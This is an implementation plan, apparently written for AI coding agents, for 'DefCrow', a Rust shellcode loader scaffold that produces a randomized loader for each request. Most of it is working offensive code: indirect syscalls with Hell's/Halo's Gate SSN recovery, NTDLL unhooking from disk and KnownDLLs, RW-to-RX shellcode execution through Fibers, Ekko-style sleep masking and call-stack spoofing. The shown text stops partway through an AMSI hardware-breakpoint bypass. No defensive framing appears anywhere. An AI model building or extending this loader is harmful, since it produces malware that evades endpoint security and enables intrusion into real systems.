# DefCrow Loader Scaffold — Implementation Plan (1 of 3)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build `loader-scaffold` — pre-compiled Rust OPSEC library plus Tera template engine that generates per-request `loader-config.rs` with fully randomized identifiers.

**Architecture:** `loader-scaffold` compiles to `libscaffold.rlib` with ALL modules included (no feature flags at compile time). The web server generates a thin `loader-config.rs` (~100 lines, all identifiers randomized via Tera helpers) and compiles it with `rustc --extern scaffold=libscaffold.rlib`. LTO + `--gc-sections` strips uncalled modules at link time. Windows-specific code gated with `#[cfg(target_os = "windows")]`; host-side tests cover pure logic (crypto, hashing, templates).

**Tech Stack:** Rust 1.75+, `windows-sys 0.52`, `aes + cbc` (AES-256-CBC), `chacha20poly1305`, `rand 0.8`, `tera 1`, `x86_64-pc-windows-gnu` target, MinGW-w64 toolchain.

---

## File Map

| File | Responsibility |
|---|---|
| `Cargo.toml` | Workspace root |
| `.cargo/config.toml` | Cross-compilation linker config |
| `loader-scaffold/Cargo.toml` | Crate deps + rlib/staticlib output |
| `loader-scaffold/src/lib.rs` | Public API re-exports |
| `loader-scaffold/src/crypto/mod.rs` | AES-256-CBC + ChaCha20 decrypt |
| `loader-scaffold/src/resolve/api_hash.rs` | djb2 hash + ntdll export walker |
| `loader-scaffold/src/evasion/syscalls.rs` | Indirect syscall (SSN + trampoline) |
| `loader-scaffold/src/evasion/unhook.rs` | NTDLL text section reload (Disk + KnownDLLs) |
| `loader-scaffold/src/evasion/module_stomp.rs` | Map shellcode over legit module |
| `loader-scaffold/src/evasion/sleep_mask.rs` | Ekko-pattern full PE masking during sleep |
| `loader-scaffold/src/evasion/stack_spoof.rs` | Synthetic return address chain |
| `loader-scaffold/src/bypass/amsi_hwbp.rs` | AMSI bypass via DR0 hardware breakpoint |
| `loader-scaffold/src/bypass/etw_hwbp.rs` | ETW bypass via DR1 hardware breakpoint |
| `loader-scaffold/src/sandbox/domain.rs` | Domain-joined check |
| `loader-scaffold/src/sandbox/usercheck.rs` | Mouse/process/RAM/uptime check |
| `loader-scaffold/src/inject/exec.rs` | No-RWX alloc RW→RX + Fiber execution |
| `loader-scaffold/src/inject/threadless.rs` | TpAllocWork callback trampoline |
| `loader-scaffold/src/inject/ppid_spoof.rs` | Parent process ID spoofing |
| `loader-scaffold/src/inject/appdomain.rs` | ICLRRuntimeHost2 CLR hosting |
| `template-engine/src/lib.rs` | Tera template runner + rand_ident helpers |
| `template-engine/templates/binary.rs.tera` | Generated binary loader template |
| `template-engine/templates/dll.rs.tera` | Generated DLL loader template |
| `template-engine/templates/appdomain.rs.tera` | Generated AppDomain loader template |
| `template-engine/templates/injector.rs.tera` | Generated injector loader template |
| `template-engine/templates/appdomain.config.tera` | AppDomain XML .config template |

---

### Task 1: Workspace Setup + Cross-compilation Toolchain

**Files:**
- Create: `Cargo.toml`
- Create: `.cargo/config.toml`
- Create: `loader-scaffold/Cargo.toml`
- Create: `loader-scaffold/src/lib.rs`

- [ ] **Step 1: Install toolchain**

```bash
brew install mingw-w64
rustup target add x86_64-pc-windows-gnu
rustup target list --installed | grep windows
```

Expected output: `x86_64-pc-windows-gnu (installed)`

- [ ] **Step 2: Create workspace `Cargo.toml`**

```toml
# Cargo.toml
[workspace]
members = ["loader-scaffold", "template-engine"]
resolver = "2"

[profile.release]
opt-level = 3
lto = true
codegen-units = 1
strip = true
panic = "abort"
```

- [ ] **Step 3: Create `.cargo/config.toml`**

```toml
# .cargo/config.toml
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
ar = "x86_64-w64-mingw32-ar"
rustflags = ["-C", "link-args=-Wl,--gc-sections"]
```

- [ ] **Step 4: Create `loader-scaffold/Cargo.toml`**

```toml
[package]
name = "loader-scaffold"
version = "0.1.0"
edition = "2021"

[lib]
crate-type = ["rlib", "staticlib"]

[target.'cfg(target_os = "windows")'.dependencies]
windows-sys = { version = "0.52", features = [
    "Win32_Foundation",
    "Win32_System_Memory",
    "Win32_System_Threading",
    "Win32_System_LibraryLoader",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_SystemInformation",
    "Win32_Security",
    "Win32_NetworkManagement_NetManagement",
    "Win32_System_Com",
    "Win32_System_ClrHosting",
    "Win32_System_Fiber",
    "Win32_System_WindowsProgramming",
    "Win32_System_Kernel",
    "Win32_System_IO",
] }

[dependencies]
aes = "0.8"
cbc = { version = "0.1", features = ["alloc"] }
chacha20poly1305 = "0.10"
rand = { version = "0.8", features = ["getrandom"] }
```

- [ ] **Step 5: Create `loader-scaffold/src/lib.rs`**

```rust
// loader-scaffold/src/lib.rs
pub mod crypto;
pub mod resolve;
pub mod evasion;
pub mod bypass;
pub mod sandbox;
pub mod inject;
```

- [ ] **Step 6: Verify workspace checks on host**

```bash
cargo check -p loader-scaffold
```

Expected: `Finished` (no errors; Windows-specific modules compile-gated)

- [ ] **Step 7: Commit**

```bash
git add Cargo.toml .cargo/config.toml loader-scaffold/
git commit -m "feat(scaffold): workspace setup + cross-compilation toolchain"
```

---

### Task 2: Crypto Module (AES-256-CBC + ChaCha20)

**Files:**
- Create: `loader-scaffold/src/crypto/mod.rs`

This module is platform-agnostic — full TDD on host.

- [ ] **Step 1: Write failing tests**

```rust
// loader-scaffold/src/crypto/mod.rs  (test block at bottom)
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_aes256_roundtrip() {
        let key = [0x42u8; 32];
        let iv  = [0x13u8; 16];
        let plaintext = b"hello defcrow shellcode padding!"; // 32 bytes

        let ciphertext = encrypt_aes256(plaintext, &key, &iv);
        let recovered  = decrypt_aes256(&ciphertext, &key, &iv).unwrap();
        assert_eq!(recovered, plaintext.to_vec());
    }

    #[test]
    fn test_chacha20_roundtrip() {
        let key   = [0x55u8; 32];
        let nonce = [0xAAu8; 12];
        let plaintext = b"shellcode bytes here 1234567890!";

        let ciphertext = encrypt_chacha20(plaintext, &key, &nonce);
        let recovered  = decrypt_chacha20(&ciphertext, &key, &nonce).unwrap();
        assert_eq!(recovered, plaintext.to_vec());
    }
}
```

- [ ] **Step 2: Run tests — verify they fail**

```bash
cargo test -p loader-scaffold crypto
```

Expected: `error[E0425]: cannot find function 'encrypt_aes256'`

- [ ] **Step 3: Implement crypto module**

```rust
// loader-scaffold/src/crypto/mod.rs
use aes::Aes256;
use cbc::{Encryptor, Decryptor};
use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};
use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce, aead::{Aead, KeyInit}};

pub fn encrypt_aes256(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let enc = Encryptor::<Aes256>::new(key.into(), iv.into());
    enc.encrypt_padded_vec_mut::<Pkcs7>(plaintext)
}

pub fn decrypt_aes256(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Result<Vec<u8>, &'static str> {
    let dec = Decryptor::<Aes256>::new(key.into(), iv.into());
    dec.decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
        .map_err(|_| "AES-256 decryption failed")
}

pub fn encrypt_chacha20(plaintext: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    cipher.encrypt(Nonce::from_slice(nonce), plaintext).unwrap()
}

pub fn decrypt_chacha20(ciphertext: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, &'static str> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    cipher.decrypt(Nonce::from_slice(nonce), ciphertext)
        .map_err(|_| "ChaCha20 decryption failed")
}
```

- [ ] **Step 4: Run tests — verify they pass**

```bash
cargo test -p loader-scaffold crypto
```

Expected: `test crypto::tests::test_aes256_roundtrip ... ok` and `test_chacha20_roundtrip ... ok`

- [ ] **Step 5: Commit**

```bash
git add loader-scaffold/src/crypto/
git commit -m "feat(scaffold): AES-256-CBC + ChaCha20 crypto module"
```

---

### Task 3: API Hash Resolution (djb2, no IAT)

**Files:**
- Create: `loader-scaffold/src/resolve/mod.rs`
- Create: `loader-scaffold/src/resolve/api_hash.rs`

djb2 hash logic is platform-agnostic (testable on host). The ntdll export walker is Windows-only.

- [ ] **Step 1: Write failing tests**

```rust
// loader-scaffold/src/resolve/api_hash.rs (test block)
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_djb2_known_values() {
        // Pre-computed: djb2("NtAllocateVirtualMemory") = 0x8B1A16A3
        assert_eq!(djb2_hash(b"NtAllocateVirtualMemory"), 0x8B1A16A3u32);
        assert_eq!(djb2_hash(b"NtProtectVirtualMemory"), 0xF783B8ECu32);
        assert_eq!(djb2_hash(b"AmsiScanBuffer"), 0x1033D1CCu32);
    }
}
```

- [ ] **Step 2: Run tests — verify they fail**

```bash
cargo test -p loader-scaffold resolve
```

Expected: FAIL (function not defined)

- [ ] **Step 3: Implement djb2 + export walker**

```rust
// loader-scaffold/src/resolve/api_hash.rs
pub fn djb2_hash(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in name {
        h = h.wrapping_shl(5).wrapping_add(h).wrapping_add(b as u32);
    }
    h
}

/// Resolve a Windows API address by hash from a loaded module base.
/// Call with the module's base address (e.g., GetModuleHandle(null) for ntdll).
///
/// Safety: base must be a valid PE image in memory.
#[cfg(target_os = "windows")]
pub unsafe fn resolve_by_hash(module_base: *const u8, target_hash: u32) -> Option<*const u8> {
    use core::slice;

    // Parse DOS header → PE header
    let dos = module_base as *const u16;
    let e_lfanew = *(module_base.add(0x3C) as *const u32) as usize;
    let nt_base = module_base.add(e_lfanew);

    // Optional header offset: NT headers = 0x18 after signature+FileHeader(20 bytes)
    // Export table RVA is at offset 0x70 from Optional header start (IMAGE_DIRECTORY_ENTRY_EXPORT)
    let optional_header = nt_base.add(0x18);
    let export_rva = *(optional_header.add(0x70) as *const u32) as usize;
    if export_rva == 0 { return None; }

    let export_dir = module_base.add(export_rva);

    let num_names     = *(export_dir.add(0x18) as *const u32) as usize;
    let names_rva     = *(export_dir.add(0x20) as *const u32) as usize;
    let ordinals_rva  = *(export_dir.add(0x24) as *const u32) as usize;
    let functions_rva = *(export_dir.add(0x1C) as *const u32) as usize;

    let names     = module_base.add(names_rva)     as *const u32;
    let ordinals  = module_base.add(ordinals_rva)  as *const u16;
    let functions = module_base.add(functions_rva) as *const u32;

    for i in 0..num_names {
        let name_rva  = *names.add(i) as usize;
        let name_ptr  = module_base.add(name_rva);
        // Find null terminator
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let name_bytes = slice::from_raw_parts(name_ptr, len);

        if djb2_hash(name_bytes) == target_hash {
            let ordinal  = *ordinals.add(i) as usize;
            let func_rva = *functions.add(ordinal) as usize;
            return Some(module_base.add(func_rva));
        }
    }
    None
}
```

- [ ] **Step 4: Create `loader-scaffold/src/resolve/mod.rs`**

```rust
// loader-scaffold/src/resolve/mod.rs
pub mod api_hash;
pub use api_hash::djb2_hash;
#[cfg(target_os = "windows")]
pub use api_hash::resolve_by_hash;
```

- [ ] **Step 5: Run tests**

```bash
cargo test -p loader-scaffold resolve
```

Expected: `test resolve::api_hash::tests::test_djb2_known_values ... ok`

Note: verify hash values by running once and correcting constants if they differ.

- [ ] **Step 6: Commit**

```bash
git add loader-scaffold/src/resolve/
git commit -m "feat(scaffold): djb2 API hash resolution + PE export walker"
```

---

### Task 4: Indirect Syscall Infrastructure (SSN + asm trampoline)

**Files:**
- Create: `loader-scaffold/src/evasion/mod.rs`
- Create: `loader-scaffold/src/evasion/syscalls.rs`

Windows-only. Test: cross-compilation check + manual Windows test.

- [ ] **Step 1: Create `loader-scaffold/src/evasion/mod.rs`**

```rust
// loader-scaffold/src/evasion/mod.rs
pub mod syscalls;
pub mod unhook;
pub mod module_stomp;
pub mod sleep_mask;
pub mod stack_spoof;
```

- [ ] **Step 2: Implement SSN resolver (Hell's Gate pattern)**

```rust
// loader-scaffold/src/evasion/syscalls.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

/// Find SSN by scanning ntdll stub bytes.
/// Pattern: 4C 8B D1  (mov r10, rcx)
///          B8 xx xx  (mov eax, SSN)
///          00 00
///          0F 05     (syscall)
#[cfg(target_os = "windows")]
pub unsafe fn get_ssn(function_name: &[u8]) -> Option<(u16, *const u8)> {
    use crate::resolve::api_hash::{djb2_hash, resolve_by_hash};

    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
    if ntdll.is_null() { return None; }

    let hash = djb2_hash(function_name);
    let func_ptr = resolve_by_hash(ntdll, hash)?;

    // Read bytes at stub
    let bytes = core::slice::from_raw_parts(func_ptr, 10);

    // Check for hooked stub: if first byte is E9 (jmp), walk neighbours (Halo's Gate)
    let ssn = if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 {
        // Clean stub — read SSN directly
        u16::from_le_bytes([bytes[4], bytes[5]])
    } else if bytes[0] == 0xE9 {
        // Hooked — search adjacent stubs (±1 ordinal) for clean SSN
        find_ssn_neighbour(ntdll, func_ptr)?
    } else {
        return None;
    };

    // Return SSN + pointer into ntdll's syscall instruction (for indirect call)
    // The trampoline is the `syscall; ret` sequence inside ntdll stub
    let trampoline = func_ptr.add(18); // bytes 18-19 = 0F 05 (syscall)
    Some((ssn, trampoline))
}

#[cfg(target_os = "windows")]
unsafe fn find_ssn_neighbour(ntdll_base: *const u8, hooked_stub: *const u8) -> Option<u16> {
    // Try up to 5 adjacent stubs in both directions
    for delta in 1u8..=5 {
        for sign in [1i64, -1i64] {
            let candidate = hooked_stub.offset(sign * delta as i64 * 32);
            let bytes = core::slice::from_raw_parts(candidate, 10);
            if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 {
                let neighbour_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
                // Our SSN = neighbour ± delta
                let our_ssn = (neighbour_ssn as i32 - (sign as i32 * delta as i32)) as u16;
                return Some(our_ssn);
            }
        }
    }
    None
}

/// Perform an indirect syscall: set SSN in rax, set r10=rcx, jmp to ntdll trampoline.
/// This makes the call stack look like it originated from ntdll.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline(never)]
pub unsafe fn indirect_syscall(
    ssn: u16,
    trampoline: *const u8,
    arg1: usize, arg2: usize, arg3: usize,
    arg4: usize, arg5: usize, arg6: usize,
) -> i32 {
    let mut result: i32;
    core::arch::asm!(
        "mov r10, rcx",        // Windows calling convention: r10 = first arg
        "mov eax, {ssn:e}",    // SSN into rax
        "jmp {tramp}",         // jump into ntdll stub (not `syscall` directly)
        ssn   = in(reg) ssn as u32,
        tramp = in(reg) trampoline,
        in("rcx") arg1, in("rdx") arg2,
        in("r8")  arg3, in("r9")  arg4,
        out("rax") result,
        options(nostack),
    );
    result
}
```

- [ ] **Step 3: Verify cross-compilation**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
```

Expected: `Finished` — no errors

- [ ] **Step 4: Commit**

```bash
git add loader-scaffold/src/evasion/
git commit -m "feat(scaffold): indirect syscall - Hell's Gate SSN + asm trampoline"
```

---

### Task 5: NTDLL Unhooking (Disk + KnownDLLs)

**Files:**
- Create: `loader-scaffold/src/evasion/unhook.rs`

- [ ] **Step 1: Implement Disk-based unhook**

```rust
// loader-scaffold/src/evasion/unhook.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::INVALID_HANDLE_VALUE,
    System::{
        LibraryLoader::GetModuleHandleA,
        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ},
        IO::CreateFileA,
    },
};

/// Reload ntdll.dll .text section from disk, overwriting hooked bytes in memory.
#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_disk() -> bool {
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ,
        GENERIC_READ, FILE_ATTRIBUTE_NORMAL,
    };
    use windows_sys::Win32::Foundation::CloseHandle;
    use crate::evasion::syscalls::get_ssn;

    let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8;
    if ntdll_base.is_null() { return false; }

    // Read ntdll from disk
    let path = b"C:\\Windows\\System32\\ntdll.dll\0";
    let h = CreateFileA(
        path.as_ptr(), GENERIC_READ, FILE_SHARE_READ,
        core::ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0,
    );
    if h == INVALID_HANDLE_VALUE { return false; }

    // Read full file into buffer
    let mut buf = vec![0u8; 0x20_0000]; // 2MB max
    let mut bytes_read: u32 = 0;
    ReadFile(h, buf.as_mut_ptr() as _, buf.len() as u32, &mut bytes_read, core::ptr::null_mut());
    CloseHandle(h);

    let disk_ntdll = buf.as_ptr();

    // Parse .text section RVA + size from disk copy
    let (text_rva, text_size) = get_text_section(disk_ntdll);

    // Change memory protection to RWX
    let target = ntdll_base.add(text_rva);
    let mut old_protect = 0u32;
    VirtualProtect(target as _, text_size, PAGE_EXECUTE_READWRITE, &mut old_protect);

    // Overwrite with clean bytes from disk
    core::ptr::copy_nonoverlapping(disk_ntdll.add(text_rva), target, text_size);

    // Restore protection
    VirtualProtect(target as _, text_size, old_protect, &mut old_protect);
    true
}

/// Parse PE .text section: return (rva, size).
#[cfg(target_os = "windows")]
unsafe fn get_text_section(base: *const u8) -> (usize, usize) {
    let e_lfanew   = *(base.add(0x3C) as *const u32) as usize;
    let nt         = base.add(e_lfanew);
    let num_sections = *(nt.add(0x06) as *const u16) as usize;
    let opt_size     = *(nt.add(0x14) as *const u16) as usize;
    // Section table starts after PE signature(4) + FileHeader(20) + OptionalHeader
    let sections   = nt.add(0x18 + opt_size) as *const [u8; 40];

    for i in 0..num_sections {
        let sec = &*sections.add(i);
        if &sec[0..5] == b".text" {
            let virt_size = u32::from_le_bytes(sec[16..20].try_into().unwrap()) as usize;
            let virt_rva  = u32::from_le_bytes(sec[12..16].try_into().unwrap()) as usize;
            return (virt_rva, virt_size);
        }
    }
    (0, 0)
}

/// Reload ntdll .text section from KnownDLLs object namespace.
#[cfg(target_os = "windows")]
pub unsafe fn unhook_ntdll_knowndlls() -> bool {
    use windows_sys::Win32::{
        System::Memory::{MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ},
        Foundation::CloseHandle,
    };

    let ntdll_base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut u8;
    if ntdll_base.is_null() { return false; }

    // Open \KnownDlls\ntdll.dll section object
    let section_name = "\\KnownDlls\\ntdll.dll";
    // Use NtOpenSection syscall directly
    let (ssn_open, tramp_open) = match crate::evasion::syscalls::get_ssn(b"NtOpenSection") {
        Some(v) => v, None => return false,
    };
    let mut h_section: isize = 0;
    // OBJECT_ATTRIBUTES for the section name (simplified — use InitializeObjectAttributes)
    // ... (full implementation uses UNICODE_STRING + OBJECT_ATTRIBUTES structs)
    // After opening section:
    let map = MapViewOfFile(h_section as _, FILE_MAP_READ, 0, 0, 0);
    if map.is_null() { CloseHandle(h_section as _); return false; }

    let (text_rva, text_size) = get_text_section(map as *const u8);
    let target = ntdll_base.add(text_rva);
    let mut old = 0u32;
    VirtualProtect(target as _, text_size, PAGE_EXECUTE_READWRITE, &mut old);
    core::ptr::copy_nonoverlapping((map as *const u8).add(text_rva), target, text_size);
    VirtualProtect(target as _, text_size, old, &mut old);

    UnmapViewOfFile(map);
    CloseHandle(h_section as _);
    true
}
```

- [ ] **Step 2: Cross-compile check**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu 2>&1 | tail -5
```

Expected: `Finished` or warnings only (no errors)

- [ ] **Step 3: Commit**

```bash
git add loader-scaffold/src/evasion/unhook.rs
git commit -m "feat(scaffold): NTDLL unhooking - Disk + KnownDLLs methods"
```

---

### Task 6: No-RWX Execution + Fiber

**Files:**
- Create: `loader-scaffold/src/inject/mod.rs`
- Create: `loader-scaffold/src/inject/exec.rs`

- [ ] **Step 1: Create `loader-scaffold/src/inject/mod.rs`**

```rust
// loader-scaffold/src/inject/mod.rs
pub mod exec;
pub mod threadless;
pub mod ppid_spoof;
pub mod appdomain;
```

- [ ] **Step 2: Implement no-RWX + Fiber execution**

```rust
// loader-scaffold/src/inject/exec.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::{
    Fiber::{CreateFiber, ConvertThreadToFiber, SwitchToFiber, DeleteFiber},
    Memory::PAGE_READWRITE,
};

/// Execute shellcode using RW alloc → write → NtProtect RX → Fiber.
/// No RWX memory is ever created — EDR memory scanners see RW during write,
/// RX during execution; never the combined RWX flag.
#[cfg(target_os = "windows")]
pub unsafe fn run_no_rwx(shellcode: &[u8]) {
    use crate::evasion::syscalls::get_ssn;

    // 1. NtAllocateVirtualMemory: alloc RW (no execute)
    let (ssn_alloc, tramp_alloc) = get_ssn(b"NtAllocateVirtualMemory").unwrap();
    let mut base_addr: usize = 0;
    let mut region_size: usize = shellcode.len();
    let process_handle: isize = -1; // current process pseudo-handle

    crate::evasion::syscalls::indirect_syscall(
        ssn_alloc, tramp_alloc,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        0, // ZeroBits
        &mut region_size as *mut usize as usize,
        0x1000 | 0x2000, // MEM_COMMIT | MEM_RESERVE
        PAGE_READWRITE as usize,
        0,
    );

    // 2. Copy shellcode into RW region
    let ptr = base_addr as *mut u8;
    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr, shellcode.len());

    // 3. NtProtectVirtualMemory: RW → RX (no write)
    let (ssn_prot, tramp_prot) = get_ssn(b"NtProtectVirtualMemory").unwrap();
    let mut old_protect: u32 = 0;
    crate::evasion::syscalls::indirect_syscall(
        ssn_prot, tramp_prot,
        process_handle as usize,
        &mut base_addr as *mut usize as usize,
        &mut region_size as *mut usize as usize,
        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ as usize,
        &mut old_protect as *mut u32 as usize,
        0,
    );

    // 4. Execute via Fiber (not a new thread — stays in current thread context)
    let main_fiber = ConvertThreadToFiber(core::ptr::null());
    let shell_fiber = CreateFiber(
        0,
        Some(core::mem::transmute(ptr as *const ())),
        core::ptr::null_mut(),
    );
    SwitchToFiber(shell_fiber);
    DeleteFiber(shell_fiber);
}
```

- [ ] **Step 3: Cross-compile check**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
```

Expected: `Finished`

- [ ] **Step 4: Commit**

```bash
git add loader-scaffold/src/inject/
git commit -m "feat(scaffold): no-RWX execution - NtAlloc RW→NtProtect RX→Fiber"
```

---

### Task 7: Sleep Masking (Ekko Pattern)

**Files:**
- Create: `loader-scaffold/src/evasion/sleep_mask.rs`

Ekko: encrypt entire PE image during sleep via timer queue APC chain, decrypt on wake.

- [ ] **Step 1: Implement Ekko sleep masking**

```rust
// loader-scaffold/src/evasion/sleep_mask.rs
#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    System::{
        Threading::{
            CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueueEx,
            INVALID_HANDLE_VALUE, WT_EXECUTEINTIMERTHREAD,
        },
        Memory::{VirtualQuery, MEMORY_BASIC_INFORMATION, MEM_IMAGE},
        LibraryLoader::GetModuleHandleA,
    },
    Foundation::HANDLE,
};

static mut SLEEP_KEY: [u8; 16] = [0u8; 16];

/// Mask the current PE image in memory for `duration_ms` milliseconds.
/// Uses CreateTimerQueue callbacks (APC-style) to encrypt before sleep
/// and decrypt after, mimicking Ekko/Gargoyle patterns.
#[cfg(target_os = "windows")]
pub unsafe fn masked_sleep(duration_ms: u32) {
    use rand::RngCore;

    // Generate ephemeral key for this sleep
    rand::rngs::OsRng.fill_bytes(&mut SLEEP_KEY);

    // Get current image base + size
    let image_base = GetModuleHandleA(core::ptr::null()) as *mut u8;
    let image_size = get_image_size(image_base);

    let timer_queue = CreateTimerQueue();

    // Timer 1 (fires immediately): encrypt image + mark NOACCESS
    let ctx1 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: true,
    }));
    let mut t1: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t1, timer_queue,
        Some(sleep_callback), ctx1 as _, 0, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    // Timer 2 (fires after duration): decrypt image + restore protection
    let ctx2 = Box::into_raw(Box::new(SleepCtx {
        base: image_base, size: image_size, encrypt: false,
    }));
    let mut t2: HANDLE = 0;
    CreateTimerQueueTimer(
        &mut t2, timer_queue,
        Some(sleep_callback), ctx2 as _, duration_ms, 0,
        WT_EXECUTEINTIMERTHREAD,
    );

    // Sleep for the duration
    windows_sys::Win32::System::Threading::Sleep(duration_ms + 100);

    DeleteTimerQueueEx(timer_queue, INVALID_HANDLE_VALUE as _);
}

struct SleepCtx { base: *mut u8, size: usize, encrypt: bool }

#[cfg(target_os = "windows")]
unsafe extern "system" fn sleep_callback(ctx: *mut core::ffi::c_void, _: u8) {
    use windows_sys::Win32::System::Memory::{
        VirtualProtect, PAGE_NOACCESS, PAGE_EXECUTE_READ,
    };
    let ctx = &*(ctx as *const SleepCtx);
    let mut old = 0u32;

    if ctx.encrypt {
        VirtualProtect(ctx.base as _, ctx.size, PAGE_NOACCESS, &mut old);
        xor_region(ctx.base, ctx.size, &SLEEP_KEY);
    } else {
        xor_region(ctx.base, ctx.size, &SLEEP_KEY); // decrypt = same XOR
        VirtualProtect(ctx.base as _, ctx.size, PAGE_EXECUTE_READ, &mut old);
    }
}

unsafe fn xor_region(base: *mut u8, size: usize, key: &[u8; 16]) {
    for i in 0..size {
        *base.add(i) ^= key[i % 16];
    }
}

#[cfg(target_os = "windows")]
unsafe fn get_image_size(base: *mut u8) -> usize {
    // Read SizeOfImage from PE optional header
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    *(base.add(e_lfanew + 0x18 + 0x38) as *const u32) as usize
}
```

- [ ] **Step 2: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/evasion/sleep_mask.rs
git commit -m "feat(scaffold): Ekko-pattern sleep masking - full PE XOR encrypt during sleep"
```

---

### Task 8: Stack Spoofing

**Files:**
- Create: `loader-scaffold/src/evasion/stack_spoof.rs`

- [ ] **Step 1: Implement synthetic call stack**

```rust
// loader-scaffold/src/evasion/stack_spoof.rs
/// Synthetically build a fake call stack before executing shellcode.
/// Pushes return addresses from known-good Windows modules (ntdll, kernel32)
/// so that stack-walking EDR sees a legitimate-looking call chain.
///
/// Call this before entering shellcode execution.
/// Uses inline asm to manipulate RSP directly.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    // Get a return address from inside ntdll (RtlUserThreadStart + offset)
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    let rts   = GetProcAddress(ntdll, b"RtlUserThreadStart\0".as_ptr());
    let fake_ret = (rts as usize) + 0x14; // mid-function, not at start

    // Get a second frame from kernel32 (BaseThreadInitThunk + offset)
    let k32   = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
    let btit  = GetProcAddress(k32, b"BaseThreadInitThunk\0".as_ptr());
    let fake_ret2 = (btit as usize) + 0x10;

    // Build synthetic stack: push fake return addresses, call shellcode,
    // then pop to restore RSP.
    core::arch::asm!(
        "sub rsp, 0x60",          // shadow space + alignment
        "mov qword ptr [rsp+0x50], {r2}", // frame 2 return addr
        "mov qword ptr [rsp+0x48], {r1}", // frame 1 return addr
        "call {fn}",               // call shellcode
        "add rsp, 0x60",
        fn = in(reg) shellcode_fn,
        r1 = in(reg) fake_ret,
        r2 = in(reg) fake_ret2,
        options(nostack),
    );
}
```

- [ ] **Step 2: Cross-compile check + commit**

```bash
cargo check -p loader-scaffold --target x86_64-pc-windows-gnu
git add loader-scaffold/src/evasion/stack_spoof.rs
git commit -m "feat(scaffold): stack spoofing - synthetic ntdll/kernel32 call chain"
```

---

### Task 9: AMSI Hardware Breakpoint Bypass

**Files:**
- Create: `loader-scaffold/src/bypass/mod.rs`
- Create: `loader-scaffold/src/bypass/amsi_hwbp.rs`

- [ ] **Step 1: Create `loader-scaffold/src/bypass/mod.rs`**

```rust
// loader-scaffold/src/bypass/mod.rs
pub mod amsi_hwbp;
pub mod etw_hwbp;
```

- [ ] **Step 2: Implement VEH + DR0 hardware breakpoint**

```rust
// loader-scaffold/src/bypass/amsi_hwbp.rs
//
// Strategy: Set DR0 = AmsiScanBuffer address + enable in DR7.
// When AmsiScanBuffer is called, CPU fires EXCEPTION_SINGLE_STEP.
// Our VEH handler: set return value to 0 (AMSI_RESULT_CLEAN), skip function.
// Zero memory modifications → no IOC.

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{EXCEPTION_SINGLE_STEP, CONTEXT_DEBUG_REGISTERS},
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_POINTERS, SetThreadContext,
            GetThreadContext, CONTEXT,
        },
        Threading::GetCurrentThread,
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
    },
};

#[cfg(target_os = "windows")]
static mut AMSI_ADDR: usize = 0;

/// Install VEH + set DR0 breakpoint on AmsiScanBuffer.
/// Call once at loader startup before any .NET / PowerShell interaction.
#[cfg(target_os = "windows")]
pub unsafe fn install_amsi_bypass() {
    let amsi = GetModuleHandleA(b"amsi.dll\0".as_ptr());
    if amsi == 0 {
        // amsi.dll not yet loaded — load it first
